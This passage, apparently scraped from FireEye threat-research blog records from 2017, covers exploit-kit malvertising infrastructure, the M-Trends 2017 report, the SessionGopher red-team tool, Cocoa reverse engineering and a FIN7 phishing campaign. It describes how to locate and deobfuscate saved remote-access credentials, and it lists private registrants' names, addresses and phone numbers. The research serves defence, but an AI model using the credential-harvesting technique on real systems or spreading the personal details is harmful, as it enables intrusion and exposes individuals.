  None<br /> Registrant Street: 4-4025 Sladeview Crescent  <br />
  Registrant City: mississauga<br /> Registrant State/Province: QC<br />
  Registrant Postal Code: L6L 5Y1<br /> Registrant Country: CA<br />
  Registrant Phone: +1.5148852225<br /> Registrant Name: bruno
  calisto<br /> Registrant [.]organization: None<br /> Registrant
  Street: 8807 PIERRE-BOUCHER  <br /> Registrant City: laval<br />
  Registrant State/Province: QC<br /> Registrant Postal Code:
  H7A3R2<br /> Registrant Country: CA<br /> Registrant Phone: +1.5148859965</p>
 <p>These domains are being used as shadow servers to Sundown EK domains
  after being loaded via legitimate ad sites hosted on Webzilla B.V
  hosting services. Table 13 shows a complete list of these domains.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab13.png"" /></p>
 <p>
  <span class=""type-XS"">Table 13: Domains involved in this campaign</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab14.png"" /></p>
 <p>
  <span class=""type-XS"">Table 14: Ads involved in redirection for this campaign</span></p>
 <p>Other malvertisement cases for Sundown EK are shown in Table 15.</p>
 <p>
  <b>
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab15.png"" /></b></p>
 <p>
  <span class=""type-XS"">Table 15: Other domains and ad services involved
    in redirection to Sundown EK</span></p>
 <h5>Terror EK</h5>
 <p>Terror EK is similar to Sundown EK. It has been consistently
  leveraging advertiser serve.popads[.]net to redirect traffic to
  domains controlled by it. The advertiser is used to redirect traffic
  to a domain hosted on IP 144.217.84.234, which is further redirected
  to domains hosted on 144.217.84.235 / 94.74.81.91 / 94.74.81.8.</p>
 <p>Earlier <a href=""https://www.trustwave.com/Resources/SpiderLabs-Blog/Terror-Exploit-Kit--More-like-Error-Exploit-Kit/"">instances
    against domains hosted on 149.202.164.86</a> were seen last year in
  December by our colleagues at Trustwave and Malwarebytes.</p>
 <p>In January 2017, new domain names appeared in the campaign hosted on
  a different IP location. However, as observed in the previous case,
  Terror EK continued the campaign to download ccminer payloads.</p>
 <p>Figure 15 and Figure 16 show ad services redirecting to domain
  onlinesalespromarketing[.]com (hosted on 144.217.84.234), which
  further redirects to a landing page domain onlinesalesproaffiliate4[.]us.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15. serve.popads[.]net redirect to shadow server</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Fig16.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 16. Shadow server redirect to Terror EK
    landing page</span></p>
 <p>Table 16 shows a list of new domains that use the above mentioned
  IP’s for hosting landing page:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Still%20Getting%20Served%20Zain/Tab16.png"" /></p>
 <p>
  <span class=""type-XS"">Table 16: New domains used by Terror EK after
    first campaign</span></p>
 <h4>Conclusion</h4>
 <p>Malvertising and exploit kits continue to be a significant threat to
  regular users. While we strongly recommend using ad blockers for all
  web browsers, we understand that it’s not always possible. For that
  reason, the best approach is to always keep your web browsers and
  applications fully updated. Also, regularly check your browser to see
  what plugins are being used and disable them if they are not necessary.</p>
 <p>In all of the examples we discussed, FireEye customers were
  protected from infection by our multi-flow and multi-vector detection engine.</p>
 <p>Update (March 17, 2017): We would like to thank PopCash, Adcash,
  Propeller Ads, AlpNames Limited and Cloudflare for closing down rogue
  accounts linked to shadow servers that were discussed in this blog.</p>",http://www.fireeye.com/blog/threat-research/2017/03/still_getting_served.html
M-Trends 2017: A View From the Front Lines,"<p>
  <img class=""float-left"" src=""https://www.fireeye.com/content/dam/fireeye-www/current-threats/images/rpt-mtrends-2017-thumb.jpg"" />Every year Mandiant responds to a large number of
  cyber attacks, and 2016 was no exception. For our <a href=""https://www.fireeye.com/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html"" target=""_blank""><i>M-Trends 2017</i> report</a>, we took a look at
  the incidents we investigated last year and provided a global and
  regional (the Americas, APAC and EMEA) analysis focused on attack
  trends, and defensive and emerging trends.</p>
 <p>When it comes to attack trends, we’re seeing a much higher degree of
  sophistication than ever before. Nation-states continue to set a high
  bar for sophisticated cyber attacks, but some financial threat actors
  have caught up to the point where we no longer see the line separating
  the two. These groups have greatly upped their game and are thinking
  outside the box as well. One unexpected tactic we observed is
  attackers calling targets directly, showing us that they have become
  more brazen.</p>
 <p>While there has been a marked acceleration of both the
  aggressiveness and sophistication of cyber attacks, defensive
  capabilities have been slower to evolve. We have observed that a
  majority of both victim organizations and those working diligently on
  defensive improvements are still lacking adequate fundamental security
  controls and capabilities to either prevent breaches or to minimize
  the damages and consequences of an inevitable compromise.</p>
 <p>Fortunately, we’re seeing that organizations are becoming better are
  identifying breaches. The global median time from compromise to
  discovery has dropped significantly from 146 days in 2015 to 99 days
  2016, but it’s still not good enough. As we noted in <i>M-Trends
  2016</i>, Mandiant’s Red Team can obtain access to domain
  administrator credentials within roughly three days of gaining initial
  access to an environment, so 99 days is still 96 days too long.</p>
 <p>We strongly recommend that organizations adopt a posture of
  continuous cyber security, risk evaluation and adaptive defense or
  they risk having significant gaps in both fundamental security
  controls and – more critically – visibility and detection of targeted attacks.</p>
 <p>On top of our analysis of recent trends, <i>M-Trends 2017</i>
  contains insights from our FireEye as a Service (FaaS) teams for the
  second consecutive year. FaaS monitors organizations 24/7, which gives
  them a unique perspective into the current threat landscape.
  Additionally, this year we partnered with law firm DLA Piper for a
  discussion of the upcoming changes in EMEA data protection laws.</p>
 <p>You can learn more in our <a href=""https://www.fireeye.com/content/fireeye-www/en_US/current-threats/annual-threat-report/mtrends.html"" target=""_blank""><i>M-Trends 2017</i> report</a>. Additionally, you
  can <a href=""https://engage.vevent.com/rt/fireeyeinc~mtrends2017?utm_source=FEcom&amp;utm_campaign=mtrends2017&amp;utm_medium=blog"">register
    for our live webinar</a> on March 29, 2017, to hear more from our experts.</p>",http://www.fireeye.com/blog/threat-research/2017/03/m-trends-2017.html
Using the Registry to Discover Unix Systems and Jump Boxes,"<p>On red team engagements, Mandiant consultants are often tasked with
  identifying and obtaining access to critical Unix systems within our
  client’s environments. The objectives may include obtaining payment
  card data on point of sale terminals or accessing intellectual
  property residing on Apple MacBooks.</p>
 <p>Since Unix systems are typically not domain-joined, locating and
  authenticating to them can be a challenge. In fact, current
  methodologies often rely on luck. Typically, this can include:</p>
 <ol> <li>Examining live hosts not enumerable through Active
  Directory.</li> <li>Running <i>netstat </i>across all domain-joined
    computers and looking for active connections over common
    Unix-communicating ports.</li> <li>Performing port scans for
    services indicative of a Unix host.</li> <li>Searching Active
    Directory for groups such as “Linux Admins” or “Mac Admins” and
    identifying their members’ workstations and active sessions.</li>
    <li>Identifying non-AD LDAP instances and hosts associated with
  them.</li> </ol>
 <p>In this blog, I address a new approach to finding Unix systems using
  a small and purely PowerShell tool we created called <a href=""https://github.com/fireeye/SessionGopher"">SessionGopher</a>.</p>
 <p>Our thought process was simple: While most Unix systems are
  off-domain, they are often accessed and managed by domain-joined
  Windows systems. These Windows systems typically have remote access
  tools installed on them that would suggest they communicate with Unix
  systems, and these tools leave behind valuable artifacts that can help
  consultants both discover and exploit the Unix systems. SessionGopher
  is designed to identify these remote access tools and extract any
  auxiliary information about the hosts to which they connect.</p>
 <h5>
  <b>Where It Happens: The HKEY_USERS Hive</b></h5>
 <p>The HKEY_USERS hive is a Windows hive that contains persistent
  information about users who have interactively logged on to the
  system. For each user that authenticates to the system, Windows
  creates a user subkey at location HKEY_USERS\&lt;SID&gt;, where
  &lt;SID&gt; is that user’s security identifier. A privileged account,
  such as a local or domain administrator, can access the contents of
  every user subkey on the system under HKEY_USERS. A non-privileged
  account on the same system can only access the user subkey associated
  with his or her account.</p>
 <p>Amazingly, within these user subkeys reside saved session
  information for some of the remote access tools discussed earlier. If
  a user creates a session in WinSCP, a file transfer client often used
  to communicate with Unix systems, and then saves that session, the
  entire saved session gets stored in the Registry under that user’s
  &lt;SID&gt; subkey:</p>
 <p>HKEY_USERS\&lt;User’s SID&gt;\Software\Martin Prikryl\WinSCP
  2\Sessions\&lt;Session Name&gt;</p>
 <p>Using regedit, a graphical interface for the Windows Registry, we
  can examine the contents of one of these sessions.</p>
 <p>
  <span class=""type-XS"">
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Using%20the%20Registry%20to%20Discover%20Session%20Gopher%20Brandon/Fig1.jpg"" />Figure
    1: A WinSCP saved session in the HKEY_USERS hive</span></p>
 <p>By default, the WinSCP password from Figure 1 is obfuscated by
  several bitwise operations, not encrypted, unless the user explicitly
  creates a master password to protect these registry values.</p>
 <p>Similarly, PuTTY, an SSH client for Windows, stores its session
  information as a separate subkey:</p>
 <p>HKEY_USERS\&lt;User’s
  SID&gt;\Software\SimonTatham\PuTTY\Sessions\&lt;Session Name&gt;</p>
 <p>While PuTTY does not store passwords, it can store the hostnames to
  which the client connects, as seen in Figure 2.<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Using%20the%20Registry%20to%20Discover%20Session%20Gopher%20Brandon/Fig2.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: A PuTTY saved session in the
    HKEY_USERS hive</span></p>
 <p>A plethora of remote access tools like these exist which store their
  saved session information in the user’s HKEY_USERS subkey. Enumerating
  the domain for systems with these artifacts provides an educated guess
  as to where Unix systems may be hiding, potentially some credentials,
  and the hosts that serve as jump boxes to those Unix systems.</p>
 <h5>
  <b>Windows Management Instrumentation (WMI)</b></h5>
 <p>In developing a post-exploitation tool, using WMI’s remote registry
  querying functionality to extract these Registry-based saved session
  artifacts made sense. Our tool <a href=""https://github.com/fireeye/SessionGopher"">SessionGopher</a>
  leverages WMI to query each SID found in the system’s HKEY_USERS hive
  for the artifacts discussed earlier.</p>
 <p>When a master password is not used, SessionGopher automatically
  deobfuscates WinSCP saved session passwords, as shown in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Using%20the%20Registry%20to%20Discover%20Session%20Gopher%20Brandon/Fig3.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: SessionGopher’s built-in WinSCP
    password deobfuscator</span></p>
 <p>On top of WinSCP and PuTTY, SessionGopher extracts saved RDP session
  data from each user’s HKEY_USERS subkey. This expands SessionGopher’s
  functionality from strictly finding Unix systems to also identifying
  systems that may serve as jump boxes to different subnets. Figure 4
  demonstrates SessionGopher returning saved RDP sessions on remote host
  “WIN7-CLIENT01” when run against a set of domain computers.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Using%20the%20Registry%20to%20Discover%20Session%20Gopher%20Brandon/Fig4.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: SessionGopher discovering saved RDP
    sessions when run across a domain</span></p>
 <h5>
  <b>Expanding Analysis Methodology</b></h5>
 <p>Certain remote access tools such as SuperPuTTY and FileZilla store
  saved sessions as files rather than in the Registry, so SessionGopher
  also searches remote filesystems for those default file locations and
  extracts saved passwords when stored. In <i>-Thorough</i> mode,
  SessionGopher searches the entire remote filesystem for PuTTY private
  key (.ppk), Remote Desktop Connection (.rdp), and RSA Soft Token
  (.sdtid) files.</p>
 <p>Currently, SessionGopher looks for artifacts from the following
  sources:<br /> </p>
 <ul> <li>WinSCP saved sessions<br /> PuTTY saved sessions</li> <li>RDP
    saved sessions</li> <li>FileZilla saved sessions</li> <li>SuperPuTTY
    saved sessions</li> <li>PuTTY .ppk Files<br /> Microsoft .rdp
  Files</li> <li>RSA .sdtid Files</li> </ul>
 <p>Running SessionGopher across targeted systems on a domain with the
  <i>–o</i> flag can nicely synthesize all session data into .csv files,
  allowing the user to keep track of the source computer and user
  account that led to the session’s discovery. Figure 5 shows
  SessionGopher’s output folder when run with <i>–o</i>.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Using%20the%20Registry%20to%20Discover%20Session%20Gopher%20Brandon/Fig5.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Folder of .csvs created by
    SessionGopher’s –o flag</span></p>
 <p>The fallacy in searching for Unix systems is that if they are not
  domain-joined, interrogating domain systems for clues provides little
  insight. As with any internal resource, Unix systems often require
  management and communication with the corporate domain. The Registry
  found on each of these domain-joined systems can serve as a trail of
  breadcrumbs to the exact location of these Unix systems, and to any
  segmented host of interest.</p>
 <p>SessionGopher can be found on <a href=""https://github.com/fireeye/SessionGopher"">FireEye's
  GitHub</a>. The tool was created by <a href=""https://twitter.com/arvanaghi"">Brandon Arvanaghi</a> and any
  subsequent updates can be found on his <a href=""https://github.com/Arvanaghi/"">personal GitHub.</a></p>",http://www.fireeye.com/blog/threat-research/2017/03/using_the_registryt.html
Introduction to Reverse Engineering Cocoa Applications,"<p>While not as common as Windows malware, there has been a steady
  stream of malware discovered over the years that runs on the OS X
  operating system, now rebranded as macOS. February saw three
  particularly interesting publications on the topic of macOS malware: a
    <a href=""https://iranthreats.github.io/resources/macdownloader-macos-malware/"">Trojan
    Cocoa application</a> that sends system information including
  keychain data back to the attacker, a <a href=""https://labs.bitdefender.com/2017/02/new-xagent-mac-malware-linked-with-the-apt28/"">macOS
    version of APT28’s Xagent malware</a>, and a <a href=""http://www.welivesecurity.com/2017/02/22/new-crypto-ransomware-hits-macos/"">new
    Trojan ransomware</a>.</p>
 <p>In this blog, the FLARE team would like to introduce two small tools
  that can aid in the task of reverse engineering Cocoa applications for
  macOS. In order to properly introduce these tools, we will lay a bit
  of foundation first to introduce the reader to some Apple-specific
  topics. Specifically, we will explain how the Objective-C runtime
  complicates code analysis in tools such as IDA Pro, and how to find
  useful entry points into a Cocoa application’s code where you can
  begin analysis.</p>
 <p>If you find these topics fascinating or if you want to be better
  prepared to investigate macOS malware in your own environment, come
  join us for a two-day crash course on this topic that we will be
  teaching at <a href=""https://www.blackhat.com/asia-17/training/os-x-malware-analysis-crash-course.html"">Black
    Hat Asia</a> and <a href=""https://www.blackhat.com/us-17/training/os-x-malware-analysis-crash-course.html"">Black
    Hat USA</a> this year.</p>
 <h5>
  <b>Cocoa Application Anatomy</b></h5>
 <p>When we use the term “Cocoa application”, we are referring to an
  application that is built using the AppKit framework, which belongs to
  what Apple refers to as the Cocoa Application Layer. In macOS,
  applications are distributed in an application bundle, a directory
  structure made to appear as a single file containing executable code
  and its associated resources, as illustrated in Figure 1.  </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Directory structure of iTerm
    application bundle</span></p>
 <p>These bundles can contain a variety of different files, but all
  bundles must contain at least two critical files: Info.plist and an
  executable file residing in the MacOS folder. The executable file can
  be any file with execute permissions, even a python or shell script,
  but it is typically a native executable. Mach-O is the native
  executable file format for macOS and iOS. The Info.plist file
  describes the application bundle, containing critical information the
  OS needs in order to properly load it. Plist files can be in one of
  three possible formats: XML, JSON, or a proprietary binary format
  called bplist. A handy utility named plutil is available in macOS that
  allows you to convert between formats, or simply pretty-print a plist
  file regardless of its format. The most notable key in the Info.plist
  file is the CFBundleExecutable key, which designates the name of the
  executable in the MacOS folder that will be executed. Figure 2 shows a
  snippet of the pretty-printed output from plutil for the iTerm
  application’s Info.plist file.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: snippet from iTerm application’s
    Info.plist file</span></p>
 <h5>
  <b>Objective-C</b></h5>
 <p>Cocoa applications are typically written in Objective-C or Swift.
  Swift, the newer of the two languages, has been quickly catching up to
  Objective-C in popularity and <a href=""http://www.tiobe.com/tiobe-index/"">appears to have overtaken
  it</a>. Despite this, Objective-C has many years over Swift, which
  means the majority of malicious Cocoa applications you will run into
  will be written in Objective-C for the time being. Additionally, older
  Objective-C APIs tend to be encountered during malware analysis. This
  can be due to the age of the malware or for the purpose of backwards
  compatibility. Objective-C is a dynamic and reflective programming
  language and runtime. Roughly 10 years ago, Objective-C version 2.0
  was released, which included major changes to both the language and
  the runtime. Where details are concerned, this blog is referring to
  version 2.0.</p>
 <p>Programs written in Objective-C are transformed into C as part of
  the compilation process, making it at least a somewhat comfortable
  transition for most reverse engineers. One of the biggest hurdles to
  such a transition comes in how methods are called in Objective-C.
  Objective-C methods are conceptually similar to C functions; they are
  a unit of code that performs a specific task, optionally taking in
  parameters and returning a value. However, due to the dynamic nature
  of Objective-C, methods are not normally called directly. Instead, a
  message is sent to the target object. The name of a method is called a
  <i>selector</i>, while the actual function that is executed is called
  an <i>implementation</i>. The message specifies a reference to the
  selector that is to be invoked along with any method parameters. This
  allows for features like “method swizzling,” in which an application
  can change the implementation for a given selector. The most common
  way in which messages are sent within Objective-C applications is the
  objc_msgSend function. Figure 3 provides a small snippet of
  Objective-C code that opens a URL in your browser. Figure 4 shows this
  same code represented in C.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig3.png"" /></p>
 <p> </p>
 <p>
  <span class=""type-XS"">Figure 3: Objective-C code snippet</span></p>
 <p> </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig4.png"" /></p>
 <p> </p>
 <p>
  <span class=""type-XS"">Figure 4: Objective-C code represented in C</span></p>
 <p>As you can see, the Objective-C code between the brackets amounts to
  a call to objc_msgSend.</p>
 <p>Unfortunately, this message sending mechanism causes problems when
  trying to follow cross-references for selectors in IDA Pro. While you
  can easily see all the cross-references for a given selector from any
  location where it is referenced, the implementations themselves are
  not called or referenced directly and so there is no easy way to jump
  from a selector reference to its implementation or vice-versa. Figure
  5 illustrates this problem by showing that the only cross-reference to
  an implementation is in the __objc_const section of the executable,
  where the runtime stores class member data.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Cross-reference to an implementation</span></p>
 <p>Of course, the information that links these selector references to
  their implementations is stored in the executable, and thankfully IDA
  Pro can to parse this data for us. In the __objc_const section, a
  structure identified by IDA Pro as __objc2_meth has the definition
  illustrated in Figure 6.</p>
 <p> </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig6.png"" /></p>
 <p> </p>
 <p>
  <span class=""type-XS"">Figure 6: __objc2_meth structure</span></p>
 <p>The first field of this structure is the selector for the method.
  One of the cross-references to this field brings us to the
  __objc_selrefs section of the executable where you can find the
    <i>selector reference</i>. Following the cross-references of the
  selector reference will reveal to us any locations in the code where
  the selector is used. The third field of the structure points to the
  implementation of the selector, which is the function we want to
  analyze. What is left to do is simply use this data to create the
  cross-references. The first of the two tools we are introducing is an
  IDAPython script named objc2_xrefs_helper.py that does just that for
  x86_64 Mach-O executable files using Objective-C 2.0. This script is
  similar to older <a href=""https://github.com/zynamics/objc-helper-plugin-ida"">IDAPython
    scripts released by Zynamics</a>, however their scripts do not
  support the x86_64 architecture. Our script is available along with
  all of our other scripts and plugins for IDA Pro from our Github repo
    <a href=""https://github.com/fireeye/flare-ida"">here</a>. For each
  Objective-C method that is defined in the executable,
  objc2_xrefs_helper.py patches the instructions that cross-reference
  its selector to reference the implementing function itself and creates
  a cross-reference from the referencing instruction to the
  implementation function. Using this script allows us to easily
  transition from a selector’s implementation to its references and
  vice-versa, as shown in Figure 7 and Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Cross-references added for implementation</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: View selector’s implementation from
    its reference</span></p>
 <p>There is a noteworthy shortcoming to this tool, however. If more
  than one class defines a method with the same name, there will only be
  one selector present in the executable. For now, the tool ignores
  these ambiguous selectors.</p>
 <h5>
  <b>Cocoa Applications – Where to Begin Looking?</b></h5>
 <p>Another quandary with reverse engineering Cocoa applications, or any
  application built with an application framework, is determining where
  the framework’s code ends and the author’s code begins. With programs
  written in C/C++, the author’s code would typically begin within the
  main function of the program. While there are many exceptions to this
  rule, this is generally the case. For programs using the Cocoa
  Application template in Apple’s IDE, Xcode, the main function simply
  performs a tail jump into a function exported by the AppKit framework
  named NSApplicationMain, as shown in Figure 9.</p>
 <p>
  <b>
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig9.png"" /></b></p>
 <p>
  <span class=""type-XS"">Figure 9: A Cocoa application's main function</span></p>
 <p>So where do we look to find the first lines of code written by the
  application’s author that would be executed? The answer to that
  question lies within NSApplicationMain. In summary, NSApplicationMain
  performs three important steps: constructing the NSApplication object,
  loading the main storyboard or nib file, and starting the event loop.
  The NSApplication object plays the important role of event and
  notification coordinator for the running application.
  NSApplicationMain looks for the name of this class in the
  NSPrincipalClass key in the Info.plist file of the application bundle.
  Xcode simply sets this key to the NSApplication class, but this class
  may be subclassed or reimplemented and the key overwritten. A
  noteworthy notification that is coordinated by the NSApplication
  object is NS‌Application‌Did‌Finish‌Launching‌Notification, which is
  designated as the proper time to run any application-specific
  initialization code the author may have. To handle this notification,
  the application may designate a delegate class that adheres to the
  NSApplicationDelegate protocol. In Objective-C, a <i>protocol
  </i>fills the role traditionally referred to as an interface in
  object-oriented parlance. The relevant method in this protocol for
  encapsulating initialization code is the
  application‌Did‌Finish‌Launching method. By default, Xcode creates
  this delegate class for you and names it AppDelegate. It even defines
  an empty applicationDidFinishLaunching method for the application
  developer to modify as desired. With all this information in hand, the
  best place to look for the initial code of most Cocoa applications is
  in a method named applicationDidFinishLaunching, as shown in Figure 10.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Search for
    applicationDidFinishLaunching method</span></p>
 <p>If you find nothing useful, then fall back to analyzing the main
  function. It is important to note that all this information is
  specific to apps created using the Cocoa Application template in
  Xcode. Cocoa applications do not need to use NSApplicationMain. One
  can write their own Cocoa application from scratch, implementing his
  or her own version of NSApplicationMain.</p>
 <h5>
  <b>Interface Builder and Nib Files</b></h5>
 <p>It was previously mentioned that one of the main responsibilities of
  NSApplicationMain is to load the main storyboard or nib file. “Nib”
  stands for NeXTSTEP Interface Builder, referring to the Interface
  Builder application that is a part of Xcode. Interface Builder allows
  developers to easily build graphical user interfaces and even wire
  their controls to variables and methods within their code using a
  graphical interface. As a developer builds GUIs with Interface
  Builder, graphs of objects are formed. An object graph is saved in XML
  format in a .xib file in the project folder. When the project is
  built, each object graph is serialized using the NSKeyedArchiver class
  and stored in Apple’s bplist format in a .nib file within the
  application bundle, typically under the Resources folder. Xcode writes
  the name of the main nib file to the application’s Info.plist file
  under the key NSMainNibFile. When an application loads a nib file,
  this object hierarchy is unpacked into memory and all the connections
  between various GUI windows, menus, controls, variables, and methods
  are established. This list of connections includes the connection
  between the application delegate and the NSApplication class.
  Storyboards were added to macOS in Yosemite. They enable the developer
  to lay out all of the application’s various views that will be shown
  to the user and specify their relationships. Under the hood, a
  storyboard is a directory containing nib files and an accompanying
  Info.plist file. The main storyboard directory is designated under the
  key NSMainStoryboardFile in the application’s Info.plist file.</p>
 <p>This brings us to the other tool we would like to share,
  nib_parse.py, which is available from our Github repo <a href=""https://github.com/fireeye/macOS-tools"">here</a>. nib_parse.py
  uses <a href=""https://github.com/cclgroupltd/ccl-bplist"">ccl_bplist</a> to
  decode and deserialize a nib file and print out the list of
  connections defined within it.  For each connection, it prints the
  label for the connection (typically a method or variable name) and the
  source and destination objects’ classes. Each object encoded by
  NSKeyedArchiver is assigned a unique numeric identifier value that is
  included in the output within enclosed parentheses. For appropriate
  GUI elements that have textual data associated with them, such as
  button labels, the text is included in the script output within
  enclosed brackets. With this information, one can determine the
  relationships between the code and the GUI elements. It is even
  possible to rewire the application, changing which functions handle
  different GUI events. Note that if a nib is not flattened, it will be
  represented as a directory that contains nib files and you can run
  this tool on the keyedobjects.nib file located within it instead. For
  storyboards, you can run this tool on the various nib files present in
  the storyboard directory.  Figure 11 shows the output of nib_parse.py
  when it is used on the MainMenu.nib file from the recently discovered
    <a href=""https://iranthreats.github.io/resources/macdownloader-macos-malware/"">MacDownloader
  threat</a> shown in Figure 12. You may notice that the GUI text in the
  tool output does not match the GUI text in the screenshot. In this
  case, many of the GUI elements are altered at run-time in the code
  illustrated in Figure 13.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig11.png"" /></p>
 <p> </p>
 <p>
  <span class=""type-XS"">Figure 11: nib_parse.py output for MacDownloader threat</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: MacDownloader's initial window</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Intro%20to%20Reverse%20Engineering%20James%20T%20Bennett/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Code updating the text of buttons</span></p>
 <p>The output from nib_parse.py shows that the author used the default
  delegate class AppDelegate provided by Xcode. The AppDelegate class
  has two instance variables for NSButton objects along with four
  instance variables for NSTextField objects. A selector named
  btnSearchAdware is connected to the same button with id (49) as the
  instance variable btnAction. This is likely an interesting function to
  begin analysis.</p>
 <h5>
  <b>Summary</b></h5>
 <p>We hope you have enjoyed this whirlwind tour of reverse engineering
  Cocoa applications. If you are interested in getting some more
  exposure to macOS internals and analysis tools, reverse engineering
  and debugging techniques, and real macOS malware found in the wild,
  then come hang out with us at Black Hat this year and learn more!</p>",http://www.fireeye.com/blog/threat-research/2017/03/introduction_to_reve.html
FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings,"<p>In late February 2017, FireEye as a Service (FaaS) identified a spear
  phishing campaign that appeared to be targeting personnel involved
  with United States Securities and Exchange Commission (SEC) filings at
  various organizations. Based on multiple identified overlaps in
  infrastructure and the use of similar tools, tactics, and procedures
  (TTPs), we have high confidence that this campaign is associated with
  the financially motivated threat group tracked by FireEye as FIN7.</p>
 <p>FIN7 is a financially motivated intrusion set that selectively
  targets victims and uses spear phishing to distribute its malware. We
  have observed FIN7 attempt to compromise diverse organizations for
  malicious operations – usually involving the deployment of
  point-of-sale malware – primarily against the retail and hospitality industries.</p>
 <h5>
  <b>Spear Phishing Campaign</b></h5>
 <p>All of the observed intended recipients of the spear phishing
  campaign appeared to be involved with SEC filings for their respective
  organizations. Many of the recipients were even listed in their
  company’s SEC filings. The sender email address was spoofed as EDGAR
  &lt;filings@sec.gov&gt; and the attachment was named
  “Important_Changes_to_Form10_K.doc” (MD5:
  <i>d04b6410dddee19adec75f597c52e386)</i>. An example email is shown in
  Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FIN7%20spear%20phishing%20steve%20miller/Fig1.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Example of a phishing email sent
    during this campaign</span></p>
 <p>We have observed the following TTPs with this campaign:</p>
 <ul> <li>The malicious documents drop a VBS script that installs a
    PowerShell backdoor, which uses DNS TXT records for its command and
    control. This backdoor appears to be a new malware family that
    FireEye iSIGHT Intelligence has dubbed POWERSOURCE. POWERSOURCE is a
    heavily obfuscated and modified version of the publicly available
    tool DNS_TXT_Pwnage. The backdoor uses DNS TXT requests for command
    and control and is installed in the registry or Alternate Data
    Streams. Using DNS TXT records to communicate is not an entirely new
    finding, but it should be noted that this has been a rising trend
    since 2013 likely because it makes detection and hunting for command
    and control traffic difficult.</li> <li>We also observed POWERSOURCE
    being used to download a second-stage PowerShell backdoor called
    TEXTMATE in an effort to further infect the victim machine. The
    TEXTMATE backdoor provides a reverse shell to attackers and uses DNS
    TXT queries to tunnel interactive commands and other data. TEXTMATE
    is “memory resident” – often described as “fileless” malware. This
    is not a novel technique by any means, but it’s worth noting since
    it presents detection challenges and further speaks to the threat
    actor’s ability to remain stealthy and nimble in operations.</li>
    <li>In some cases, we identified a Cobalt Strike Beacon payload
    being delivered via POWERSOURCE. This particular Cobalt Strike
    stager payload was previously used in operations linked to
  FIN7.</li> <li>We observed that the same domain hosting the Cobalt
    Strike Beacon payload was also hosting a CARBANAK backdoor sample
    compiled in February 2017. CARBANAK malware has been used heavily by
    FIN7 in previous operations.</li> </ul>
 <h5>
  <b>Victims</b></h5>
 <p>Thus far, we have directly identified 11 targeted organizations in
  the following sectors:</p>
 <ul> <li>Financial services, with different victims having insurance,
    investment, card services, and loan focuses</li>
  <li>Transportation</li> <li>Retail</li> <li>Education</li> <li>IT
  services</li> <li>Electronics</li> </ul>
 <p>All these organizations are based in the United States, and many
  have international presences. As the SEC is a U.S. regulatory
  organization, we would expect recipients of these spear phishing
